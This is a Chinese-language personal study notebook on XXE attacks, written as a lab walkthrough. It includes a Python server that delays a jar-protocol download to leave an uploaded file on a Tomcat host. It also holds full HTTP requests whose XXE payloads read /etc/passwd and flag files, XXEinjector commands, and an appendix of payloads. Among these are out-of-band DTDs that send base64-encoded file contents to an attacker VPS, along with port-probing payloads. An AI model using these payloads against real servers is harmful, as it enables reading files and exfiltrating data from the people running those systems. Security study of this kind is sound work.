                headers = ('''HTTP/1.0 200 OK\r\n'''
                '''Content-Type: application/java-archive\r\n\r\n''')
                self.request.sendall(headers.encode('ascii'))

                self.request.sendall(contents[:-1])
                time.sleep(30)
                print(30)
                self.request.sendall(contents[-1:])

            except Exception as e:
                print ("get error at:"+str(e))


if __name__ == '__main__':

    jarserver = socketserver.TCPServer((listen_host,listen_port), JarRequestHandler) 
    print ('waiting for connection...' + jar_file) 
    server_thread = threading.Thread(target=jarserver.serve_forever) 
    server_thread.daemon = True 
    server_thread.start() 
    server_thread.join()
```
脚本先发送文件的除最后一个字符的所有内容，相隔30s再发送最后一个字符。<br />之后准备需要上传的文件，这里以一个xml文本为例<br />![截屏2021-06-22 上午12.34.29.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624293288643-a7ce7a81-aa5d-4151-bcb0-2115d5930e90.png#align=left&display=inline&height=1748&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.34.29.png&originHeight=1748&originWidth=2504&size=1840546&status=done&style=none&width=2504)<br />将这个xml文本打包成zip文件，命名为1.zip<br />![截屏2021-06-22 上午12.37.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624293478345-055c7d85-e13d-4997-937b-078881e76878.png#align=left&display=inline&height=218&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.37.44.png&originHeight=426&originWidth=818&size=148918&status=done&style=none&width=418)<br />对这个1.zip进行16进制编辑，在文件的末尾加一些废数据（目的是，上面的python脚本发送的文件不包括最后一个字符，而加上这些废数据后，这些废数据就会被当作最后一个字符舍弃，只读取文件前面正确的数据。）<br />![截屏2021-06-22 上午12.47.54.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624294354644-6ae662db-9e83-4a76-8373-fea95b820e90.png#align=left&display=inline&height=438&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.47.54.png&originHeight=958&originWidth=1314&size=536620&status=done&style=none&width=601)<br />然后在kali主机的1.zip所在目录运行前面所说的python脚本，启动监听<br />![截屏2021-06-22 上午1.06.41.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624295235350-e3a78c1f-a0eb-4e93-86cf-bac1f656e54e.png#align=left&display=inline&height=87&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.06.41.png&originHeight=170&originWidth=720&size=54196&status=done&style=none&width=368)<br />**在本机（mac）使用如下操作**<br />之后打开burp，抓取发送到目标服务器的包<br />![截屏2021-06-22 上午12.58.06.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624294727991-b45b8651-71f2-4126-8355-7ab41baa88b3.png#align=left&display=inline&height=1762&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%8812.58.06.png&originHeight=1762&originWidth=2696&size=482409&status=done&style=none&width=2696)<br />改包，将数据包改为如下内容并发送
```xml
POST /XXE/doLogin HTTP/1.1
Host: 192.168.43.231:8080
Content-Length: 203
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://192.168.43.231:8080
Referer: http://192.168.43.231:8080/XXE/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user[
<!ENTITY baz SYSTEM "jar:http://192.168.43.147:9999/1.zip!/shell.jsp">
]>
<user><username>admin&baz;</username><password>admin</password></user>
```
可以看到kali处已经收到了请求<br />![截屏2021-06-22 上午1.10.53.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624295520460-7e0aa79c-3ddb-40ac-a7b8-6caae2690035.png#align=left&display=inline&height=181&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.10.53.png&originHeight=394&originWidth=986&size=159705&status=done&style=none&width=454)<br />等待30s后（前面python脚本的原因），收到回复包，在回复包中，我们得到了目标服务器的目录<br />![截屏2021-06-22 上午1.13.31.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624295669779-36fcaa86-1d0e-49dc-9f68-5bda2a9afefc.png#align=left&display=inline&height=1762&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.13.31.png&originHeight=1762&originWidth=2696&size=713365&status=done&style=none&width=2696)<br />其中 jar_cache1237144420571861472.tmp 文件即我们所上传的1.zip文件，根据jar的原理，tomcat在收到1.zip后，则将其变成tmp后缀（是的，只是改了下后缀），之后再将tmp文件解压，然后得到里面的内容，然后迅速将tmp文件删除。但这里我们在路径中写了一个不存在的 shell.jsp ,所以tomcat找不到，并且报错（向我们传递了tomcat目录）。并且最重要的是，由于我们的python脚本在文件发送过程中停止了30s，所以此tmp文件在tomcat关闭之前并不会被删除，由此，我们的文件上处成功。

可以看到，在目标服务器中，已经存在我们所上传的tmp文件<br />![截屏2021-06-22 上午1.22.42.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624296212889-d37f76fe-a344-4298-af52-ad211176b059.png#align=left&display=inline&height=1184&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.22.42.png&originHeight=1184&originWidth=1574&size=203616&status=done&style=none&width=1574)
## python下的XXE漏洞
本实验使用kali linux作为目标服务器，mac作为攻击机<br />kali开启服务<br />![截屏2021-06-22 上午1.48.06.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624297815175-dc4403cd-9a17-4c51-a650-9a0d6b3f51ff.png#align=left&display=inline&height=139&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.48.06.png&originHeight=430&originWidth=1282&size=205493&status=done&style=none&width=414)<br />访问服务器<br />![截屏2021-06-22 上午1.47.18.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624297885799-1b4e3a18-7bec-4488-8a5d-de45ec68f120.png#align=left&display=inline&height=1662&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%881.47.18.png&originHeight=1662&originWidth=2604&size=412582&status=done&style=none&width=2604)<br />burp抓包改包发包，改包为如下
```xml
POST /doLogin HTTP/1.1
Host: 192.168.43.147:8008
Content-Length: 169
Accept: application/xml, text/xml, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
Content-Type: application/xml;charset=UTF-8
Origin: http://192.168.43.147:8008
Referer: http://192.168.43.147:8008/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE user[
<!ENTITY baz SYSTEM "file:///etc/passwd">
]>
<user><username>&baz;</username><password>admin</password></user>
```
发包后，可在返回包中看到passwd文件的内容<br />![截屏2021-06-22 上午2.05.24.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624298739780-f2ad89fb-e5b8-40d2-a785-3a27ffc430bd.png#align=left&display=inline&height=1762&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8A%E5%8D%882.05.24.png&originHeight=1762&originWidth=2696&size=876145&status=done&style=none&width=2696)
## XXE自动化注入
这里利用XXEinjector进行自动化注入<br />首先抓包，将发送包保存为txt文件<br />如下抓了xxe_php的包和xxe_java的包<br />![截屏2021-06-22 下午8.12.27.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624363957889-6188a716-184b-4ddd-97fc-2d85e0f1067e.png#align=left&display=inline&height=239&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.12.27.png&originHeight=478&originWidth=242&size=27999&status=done&style=none&width=121)<br />![截屏2021-06-22 下午8.13.03.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364004122-41bfd2a8-f3a8-4c68-9a20-b5dfb1162aed.png#align=left&display=inline&height=972&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.13.03.png&originHeight=972&originWidth=1500&size=255072&status=done&style=none&width=1500)<br />![截屏2021-06-22 下午8.13.10.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364014050-ac9cf45a-5547-4461-bbf5-18bd28bd6938.png#align=left&display=inline&height=972&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.13.10.png&originHeight=972&originWidth=1500&size=257199&status=done&style=none&width=1500)<br />之后就可以打开终端进行注入

1. 读取文件内容

首先确认，目标服务器中的文件内容如下<br />![截屏2021-06-22 下午8.14.57.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364140136-64a585dd-2abc-4a15-8fc1-8707c419f132.png#align=left&display=inline&height=140&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.14.57.png&originHeight=202&originWidth=366&size=30106&status=done&style=none&width=254)<br />之后输入<br />ruby XXEinjector.rb --host=192.168.43.204 --file=java8080.txt --path=c:/flag.txt --verbose<br />可以看到已经得到了文件内容<br />![截屏2021-06-22 下午8.16.44.png](https://cdn.nlark.com/yuque/0/2021/png/2424924/1624364227672-33274ae3-fcd0-47eb-a3c3-5ab2e864b717.png#align=left&display=inline&height=1702&margin=%5Bobject%20Object%5D&name=%E6%88%AA%E5%B1%8F2021-06-22%20%E4%B8%8B%E5%8D%888.16.44.png&originHeight=1702&originWidth=3016&size=1155719&status=done&style=none&width=3016)<br />若要读取特殊字符，如PHP文件，则应该在后面加上<br />--phpfilter<br />(仅限php环境)<br />ruby XXEinjector.rb --host=192.168.43.204 --file=java8080.txt --path=c:/flag.txt --verbose --phpfilter

---

2. 获取服务器的hash

这里同上面获取hash的过程一样，无法成功，metasploit这边获取不到…………

---

3. 目录遍历

无论是mac本机还是kali虚拟机还是docker下的kali，都无法成功……
## metinfo6.0.0 cms漏洞审计
这个以后再补充吧
## xxe综合靶场拿flag
这个以后再补充吧
# 所涉及XXE代码
```xml
【试验】PHP语言下的XXE漏洞实战的代码：
<?xml version='1.0'?>
<!DOCTYPE user [
<!ENTITY margin SYSTEM "file:///c:/flag.txt">
]>
<user><username>admin&margin;</username><password>admin</password></user>


XXE读取有特殊字符的文件
payload如下
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE roottag [
<!ENTITY % start "<![CDATA[">   
<!ENTITY % goodies SYSTEM "file:///C:/Windows/test.txt">  
<!ENTITY % end "]]>">  
<!ENTITY % dtd SYSTEM "http://127.0.0.1:83/evil.dtd"> 
%dtd; 
]> 
evil.dtd文件内容
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY all "%start;%goodies;%end;">
ENTITY中定义CDATA

XXE无回显读取文件
<?xml version="1.0"?>
<!DOCTYPE test [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=d:/hacker.txt">
<!ENTITY % dtd SYSTEM "http://VPS的IP地址/evil.xml">
%dtd;
%send;
]>
evil.xml内容
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://VPS的IP地址/?content=%file;'>">
%payload;

探测端口1
<?xml version='1.0'?>
<!DOCTYPE user [
<!ENTITY dtd SYSTEM "http://192.168.0.103">
]>
<user><username>admin&dtd;</username><password>admin</password></user

探测端口2
<?xml version='1.0'?>
<!DOCTYPE user [
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=http:IP:PORT">
<!ENTITY % dtd SYSTEM "http://192.168.0.110/evil.xml">
%dtd;
%send;
]>
<user><username>admin</username><password>admin</password></user>
evil.xml内容
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://VPS的IP地址/?content=%file;'>">
%payload;

jar协议上传文件
压缩要上传的文件，末尾加入垃圾字符
启动监听：python3 xxe_server xx.zip
<?xml version="1.0"?>
<!DOCTYPE user [
<!ENTITY margin SYSTEM "jar:http://192.168.0.100:9999/xx.zip!/shell.txt">
]>
<user><username>a&margin;</username><password>a</password></user>

```
# 一篇好文章
[一篇文章带你深入理解漏洞之 XXE 漏洞 - 先知社区.pdf](https://www.yuque.com/attachments/yuque/0/2021/pdf/2424924/1624119577988-3bc0773f-a611-4cff-83b2-cb9cf2c9a930.pdf)
